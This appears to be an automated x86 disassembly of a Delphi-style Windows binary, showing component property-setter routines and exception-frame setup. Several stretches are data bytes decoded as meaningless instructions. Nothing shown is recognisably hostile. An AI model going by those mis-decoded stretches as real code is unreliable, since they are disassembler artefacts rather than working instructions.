add [ eax ] al
add [ eax ] al
add [ esi - 0x5bffbb4e ] dl
mov dl 0x44
add [ eax - 0x4c000000 ] ah
scasb [ edi ]
inc esp
add al ch
loope r-xdata
inc eax
add [ eax + eax ] ah
add ah ah
fiadd [ ecx ]
fcomp st6
inc ecx
add [ eax ] cl
loop r-xdata
add [ eax + 0x24004041 ] bh
fild [ ecx ]
rol [ ecx + 0x40 ] 0x0
mov ah 0x41
inc eax
add ah bh
inc eax
add [ edx ] al
add dh ch
add [ eax ] al
mov al 0x10
inc eax
add [ eax + eax ] bh
add [ eax + 0x78004010 ] dh
add [ eax ] al
add [ eax + 0x7c004010 ] dh
add [ eax ] al
add ah al
mov edx 0xe4ec0044
inc ecx
add [ eax + 0x240041e4 ] dl
in al 0x41
add [ esp + 0x41 ] dl
add [ eax ] ch
in al 0x41
add [ eax - 0x4b ] dh
inc esp
add [ esi + edi * 4 + 0x44 ] ah
add ah bh
mov ebp 0xc13c0044
inc esp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + 0x64004010 ] dh
add [ eax ] al
sub_44b29a
out dx eax
dec [ eax - 0x4fffbb40 ]
rol [ eax + eax + 0xd ] 0x54
inc ebx
jne r-xdata
cld
je r-xdata
insb
mov edx 0xba800044
inc esp
add [ edx + edi * 4 - 0x4567ffbc ] dl
add al dl
loop r-xdata
inc eax
inc eax
add ah bh
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
mov eax eax
mov eax 0x70044b2
or eax 0x73754354
je r-xdata
inc esp
add [ edx + edi * 4 - 0x4557ffbc ] ah
inc esp
add [ edx + edi * 4 - 0x454fffbc ] ch
inc esp
add [ edx + edi * 4 - 0x4547ffbc ] dh
inc esp
add [ edx + edi * 4 - 0x453fffbc ] bh
inc esp
add [ ebx ] cl
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x7de85653
cmp [ edx - 0x456bffbc ] 0x44
add [ eax - 0x63ffbb46 ] bl
mov edx 0xbaa00044
add [ eax ] cl
jecxz r-xdata
inc esp
add [ edx + edi * 4 - 0x455fffbc ] bl
add [ eax - 0x1d ] ch
inc ecx
add [ ebx ] bh
inc ecx
add [ ebx + 0x41 ] ch
add [ edx - 0x1cdfffbf ] cl
inc ecx
add [ ebx + 0x41 ] dh
add ah cl
mov ecx 0xb9e00044
inc esp
add ah dh
mov ecx 0xba080044
inc esp
add [ edx + edi * 4 ] bl
inc esp
add [ eax ] dh
mov edx 0xba440044
inc esp
add [ eax - 0x46 ] bl
inc esp
add [ edx + edi * 4 + 0x44 ] ch
add [ eax - 0x6bffbb46 ] al
add [ eax ] bl
aas
inc eax
add ah dl
loop r-xdata
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
and [ edx - 0x5077ffbc ] dh
inc esp
add [ ebx ] al
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0xb3280000
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x180044b3 ] ah
add [ eax ] al
add al dl
push ecx
inc ecx
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
mov edx 0xba980044
xchg esp eax
sub_44b3ac
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
mov eax [ esi + 0x5c ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41e3c4
test bl bl
jle r-xdata
mov edx esi
call sub_44b7c0
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_44b41c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41ded4
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebx
call sub_44b4c4
sub_44b450
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44b3e0
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x5c ]
mov edi [ edx + 0x30 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_4166b4
mov eax [ ebx + 0x5c ]
mov eax [ eax + 0x30 ]
mov ecx ebx
mov edx esi
call sub_416844
sub_44b498
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x58 ]
call sub_405270
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x58 ]
mov edx esi
call sub_404e98
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x30 ]
sub_44b4c4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x5c ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_44b7c0
mov edx ebx
mov eax esi
call sub_44b7a0
sub_44b4ec
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_44b4c4
sub_44b518
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_459f4c
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff3
call sub_404160
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_41e458
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb040
call sub_438c24
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44b570
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_459f74
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff0
call sub_404160
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_41e474
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb03f
call sub_438c24
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44b5c8
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41da5c
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebx + 0x30 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_44b74c
mov [ ebx + 0x58 ] 0x0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_44b634
push ebx
push esi
push edi
call sub_404330
mov ebx edx
mov edi eax
mov eax [ edi + 0x34 ]
call sub_403f64
jmp r-xdata
mov esi [ edi + 0x30 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_4168b0
call sub_403f64
mov eax [ edi + 0x30 ]
call sub_403f64
mov edx ebx
and dl 0xfc
mov eax edi
call sub_41daa8
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4042d8
sub_44b684
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_44b6cc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_416824
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_404114
mov edx edi
call sub_44b450
sub_44b718
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x38 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x34 ]
call sub_44a5d8
pop esi
pop ebx
retn
mov edx [ ebx + 0x34 ]
call sub_44a61c
mov edx ebx
mov eax [ ebx + 0x38 ]
call sub_41db30
sub_44b758
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_41dd8c
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x38 ]
jne r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax esi
call sub_44b7c0
sub_44b7a0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_416668
mov [ esi + 0x5c ] ebx
mov edx ebx
mov eax esi
call sub_41db30
pop esi
pop ebx
retn
sub_44b7c0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_416964
test eax eax
jl r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x5c ] eax
sub_44b7dc
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
test [ ebx + 0x1c ] 0x10
je r-xdata
inc esi
xor edi edi
pop edi
pop esi
pop ebx
retn
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
dec esi
jne r-xdata
cmp [ esi + 0x298 ] 0x0
je r-xdata
mov eax [ esi + 0x298 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_44b844
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov [ esp ] eax
mov [ esp + 0x4 ] 0x0
call sub_434ba4
test al al
jne r-xdata
movzx eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
call sub_44e638
mov ebx eax
movzx eax [ esi + 0x4 ]
mov edx ebx
call sub_4308f8
mov ebp eax
test bp bp
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp bp [ ebx + 0x84 ]
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov ebx [ eax + edi * 4 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
mov [ esp + 0x4 ] al
jmp r-xdata
cmp [ ebx + 0x90 ] 0x0
je r-xdata
mov eax ebx
call sub_44c114
mov edx ebp
call sub_44c174
inc eax
je r-xdata
sub_44b8e8
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x4a ] 0x0
je r-xdata
movzx eax [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_44b908
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x52 ] 0x0
je r-xdata
movzx eax [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_44b928
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebx eax
movzx eax [ ebx + 0x58 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x1 ] al
movzx eax [ esp ]
mov [ ebx + 0x58 ] al
cmp al 0x1
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
inc esi
xor ebp ebp
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
test edi edi
je r-xdata
dec al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
cmp [ esp + 0x1 ] 0x2
jne r-xdata
test edi edi
je r-xdata
jmp r-xdata
inc ebp
dec esi
jne r-xdata
movzx edx [ edi + 0x94 ]
mov eax edi
call sub_44bd80
cmp [ esp ] 0x2
jne r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov edi [ eax + ebp * 4 ]
movzx eax [ esp ]
sub al 0x1
jb r-xdata
movzx eax [ edi + 0x6a ]
mov [ edi + 0x94 ] al
mov dl 0x1
mov eax edi
call sub_44bd80
sub_44bac4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41e380
mov [ esi + 0x6a ] 0x1
mov [ esi + 0x80 ] 0xffffffff
mov [ esi + 0x86 ] 0x1
xor eax eax
mov [ esi + 0x90 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax esi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_44bb18
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
mov eax [ esi + 0x98 ]
call sub_403f64
mov eax [ esi + 0x9c ]
call sub_403f64
cmp [ esi + 0x90 ] 0x0
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44b3ac
test bl bl
jle r-xdata
lea eax [ esi + 0x90 ]
call sub_40f8bc
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_44bb68
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_416eac
mov edx [ ebx + 0x64 ]
mov edi esi
mov eax edi
call sub_44bc18
movzx edx [ ebx + 0x69 ]
mov eax edi
call sub_44bc78
movzx edx [ ebx + 0x6a ]
mov eax edi
call sub_44bd80
mov edx [ ebx + 0x74 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x7c ]
mov eax edi
call sub_44bebc
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_44bf1c
movzx edx [ ebx + 0x84 ]
mov eax edi
call sub_44bf78
movzx edx [ ebx + 0x86 ]
mov eax edi
call sub_44bfdc
push [ ebx + 0x44 ]
push [ ebx + 0x40 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax [ ebx + 0x48 ]
mov [ edi + 0x48 ] eax
mov eax [ ebx + 0x4c ]
mov [ edi + 0x4c ] eax
mov eax [ ebx + 0x38 ]
mov [ edi + 0x38 ] eax
mov eax [ ebx + 0x3c ]
mov [ edi + 0x3c ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44bc18
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x64 ]
call sub_405270
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x64 ]
mov edx [ esp ]
call sub_404e98
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_404114
test eax eax
je r-xdata
sub_44bc78
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x68 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x1
xor edx edx
push ebp
push sub_44bd70
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x69 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x69 ] bl
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x6c ] 0x0
jle r-xdata
inc edi
xor esi esi
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x69 ] 0x0
je r-xdata
inc esi
dec edi
jne r-xdata
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
call sub_44b710
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_404114
test eax eax
je r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
mov edx esi
call sub_44b6fc
mov ebx eax
cmp ebx [ ebp - 0x4 ]
je r-xdata
mov eax [ ebx + 0x6c ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x6c ]
jne r-xdata
xor edx edx
mov eax ebx
call sub_44bc78
sub_44bd80
push ebx
push esi
push edi
push ecx
mov [ esp ] dl
mov ebx eax
movzx eax [ esp ]
cmp al [ ebx + 0x6a ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
movzx edx [ eax + 0x58 ]
cmp dl 0x1
jne r-xdata
movzx eax [ esp ]
mov [ ebx + 0x6a ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
cmp dl 0x2
jne r-xdata
movzx eax [ esp ]
mov [ ebx + 0x6a ] al
jmp r-xdata
inc edi
dec esi
jne r-xdata
movzx edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov [ esp ] 0x1
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_404114
test eax eax
je r-xdata
sub_44bdfc
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax ebp
mov edx [ ebx + 0x78 ]
call sub_405270
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
lea eax [ ebx + 0x78 ]
mov edx ebp
call sub_404e98
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4167c8
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4167c8
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
sub_44be64
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x74 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x74 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_404114
test eax eax
je r-xdata
sub_44bebc
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x7c ]
call sub_405270
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x7c ]
mov edx [ esp ]
call sub_404e98
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_404114
test eax eax
je r-xdata
sub_44bf1c
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x80 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x80 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_404114
test eax eax
je r-xdata
sub_44bf78
push ebx
push esi
push edi
push ecx
mov [ esp ] dx
mov ebx eax
movzx eax [ esp ]
cmp ax [ ebx + 0x84 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
movzx eax [ esp ]
mov [ ebx + 0x84 ] ax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
movzx edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_404114
test eax eax
je r-xdata
sub_44bfdc
push ebx
push esi
push edi
push ecx
mov [ esp ] dl
mov ebx eax
movzx eax [ esp ]
cmp al [ ebx + 0x86 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
movzx eax [ esp ]
mov [ ebx + 0x86 ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
movzx edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_404114
test eax eax
je r-xdata
sub_44c03c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x64 ]
call sub_405270
jne r-xdata
xor eax eax
jmp r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov ebx eax
mov edx edi
mov eax esi
call sub_41dfcc
test bl bl
je r-xdata
mov al 0x1
test [ ebx + 0x1c ] 0x1
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_44bc18
sub_44c088
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x8a ] 0x0
je r-xdata
movzx eax [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
sub_44c0b0
push ebx
mov ebx eax
xor eax eax
mov edx [ ebx + 0x5c ]
test edx edx
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x44 ]
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ edx + 0x58 ] 0x0
jne r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x95 ] 0x0
je r-xdata
pop ebx
retn
xor eax eax
jmp r-xdata
mov eax ebx
call sub_44b518
test al al
jne r-xdata
cmp [ ebx + 0x69 ] 0x0
je r-xdata
mov al 0x1
movzx edx [ ebx + 0x69 ]
xor dl 0x1
mov eax ebx
call sub_44bc78
cmp [ ebx + 0x69 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
sub_44c148
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_418c40
mov edi eax
mov eax esi
call sub_430c04
movzx ecx ax
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax edi
pop edi
pop esi
pop ebx
retn
sub_44c174
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0xffffffff
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov [ esp ] ebx
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp bp ax
jne r-xdata
sub_44c1b8
push ebp
mov ebp esp
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c1e4
retn
sub_44c208
add ecx [ edi ]
push esp
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
mov al [ 0x480044c2 ]
add [ eax ] al
add [ eax ] al
inc edx
inc ecx
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ ebp + ebp * 2 + 0x6eac0041 ] bl
inc ecx
add [ esi + ebp * 2 - 0x1763ffbf ] dh
inc esp
add [ ecx ] dl
je r-xdata
inc [ ecx ]
add [ 0x6f6c6f43 ] al
jb r-xdata
outsd
inc ebx
outsd
outsb
je r-xdata
pushfd
insd
insb
add [ gs : eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ edx + eax * 8 ] al
inc esp
add [ ecx ] cl
jae r-xdata
out dx eax
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax + eax ] 0x0
rol [ eax + eax + 0x8 ] 0x0
add bh bh
or [ eax ] al
add bh bh
xchg esp eax
call sub_44c378
jb r-xdata
sar [ eax + 0x70044c2 ] 0x11
push esp
inc ebx
outsd
pushfd
call 0x5455c2e6
push edx
jne r-xdata
outsb
cmp al 0x10
inc eax
add [ eax ] dl
add [ eax ] al
[ ecx + esi * 8 + 0x44 ]
adc [ eax ] al
sbb al [ eax ]
add bh bh
sbb al [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
push es
dec ebp
popad
jb r-xdata
push esp
arpl [ ebx + 0x5 ] bp
inc esi
outsd
jb r-xdata
add [ eax + 0x8 ] al
add al [ eax ]
or [ ecx + 0x6e ] ecx
arpl [ edx + 0x65 ] si
insd
outsb
je r-xdata
add [ eax ] al
outsd
insb
push ebx
arpl [ edx + 0x6f ] si
insb
insb
